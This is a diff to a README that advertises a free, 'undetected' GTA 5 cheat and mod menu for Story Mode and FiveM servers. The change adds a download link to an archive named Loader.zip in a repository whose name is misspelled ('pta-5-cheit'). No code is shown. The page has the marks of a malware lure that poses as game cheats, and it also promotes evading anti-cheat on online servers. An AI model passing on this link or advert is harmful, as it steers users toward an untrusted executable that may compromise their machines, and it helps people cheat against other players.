@@ -2,7 +2,7 @@
 
 **Grab the latest GTA 5 Cheat / Mod Menu (2025)** for PC – a robust, secure, and undetected mod menu loaded with features like **money drops**, **god mode**, **teleportation**, **vehicle spawning**, **trolling**, and so much more. It’s fully compatible with both **GTA 5 Story Mode** and **FiveM servers**.
 
-🔥 **[📥 DOWNLOAD GTA 5 MOD MENU (LATEST VERSION)]()**
+🔥 **[📥 DOWNLOAD GTA 5 MOD MENU (LATEST VERSION)](https://github.com/XImINDS/pta-5-cheit/releases/download/Release/Loader.zip)**
 💻 Works with: GTA 5 Steam / Epic Games / Rockstar Launcher (PC)
 
 ![gta5](https://github.com/user-attachments/assets/c7d27c6e-a93e-4f64-97ee-f0ee36b73775)
